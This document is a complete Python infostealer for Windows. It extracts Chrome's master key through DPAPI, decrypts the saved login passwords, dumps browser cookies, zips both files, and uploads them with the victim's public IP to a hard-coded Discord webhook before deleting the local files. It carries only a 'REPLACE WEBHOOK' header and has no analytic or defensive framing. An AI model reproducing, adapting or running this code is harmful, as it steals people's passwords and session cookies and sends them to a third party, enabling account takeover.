# REPLACE WEBHOOK

import os, json, base64, requests, sqlite3, win32crypt, zipfile, browser_cookie3, shutil
from Cryptodome.Cipher import AES
from io import BytesIO

def get_master_key():
	local_state_file = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\Local State")
	with open(local_state_file, "r") as f:
		local_state = json.loads(f.read())
	encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
	key = win32crypt.CryptUnprotectData(encrypted_key[5:], None, None, None, 0)[1]
	return key

def decrypt_payload(cipher, payload):
	return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
	return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(buff, master_key):
	iv = buff[3:15]
	payload = buff[15:]
	cipher = generate_cipher(master_key, iv)
	decrypted_pass = decrypt_payload(cipher, payload)
	decrypted_pass = decrypted_pass[:-16].decode()
	return decrypted_pass

def main():
	master_key = get_master_key()
	login_db = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\Google\Chrome\User Data\default\Login Data")
	shutil.copy2(login_db, "Loginvault.db")
	conn = sqlite3.connect("Loginvault.db")
	cursor = conn.cursor()
	with open("passwords.txt", "w") as f:
		try:
			cursor.execute("SELECT action_url, username_value, password_value FROM logins")
			for r in cursor.fetchall():
				url = r[0]
				username = r[1]
				encrypted_password = r[2]
				decrypted_password = decrypt_password(encrypted_password, master_key)
				if len(username) > 0:
					f.write(f"URL: {url}\nUser Name: {username}\nPassword: {decrypted_password}\n{'*' * 50}\n")
		except Exception as e:
			pass
	cursor.close()
	conn.close()
	try:
		os.remove("Loginvault.db")
	except Exception as e:
		pass

	with open("cookies.txt", "w") as f:
		load = browser_cookie3.load()
		for i in load:
			f.write(f"Name: {i.name}\nDomain: {i.domain}\nValue: {i.value}\n")

	with zipfile.ZipFile("beamed.zip", mode="w") as my_zip:
		my_zip.write("passwords.txt")
		my_zip.write("cookies.txt")

	file_path = "beamed.zip"
	with open(file_path, "rb") as f:
		file_data = f.read()
	file = BytesIO(file_data)
	file.name = "beamed.zip"

	url = "https://discord.com/api/webhooks/1094926456007688303/8lL73Ob7r0QA4CcVnzaGUn1_s33JtTp_u-VqpbcrKaVSicQVpHWMByymP1WCYRMq2bgz"
	data = {"content" : f"IP: `{requests.get('https://api.ipify.org/').text}`"}
	files = {"file": file}
	requests.post(url, data=data, files=files)

	os.remove("passwords.txt")
	os.remove("cookies.txt")

if __name__ == "__main__":
	main()
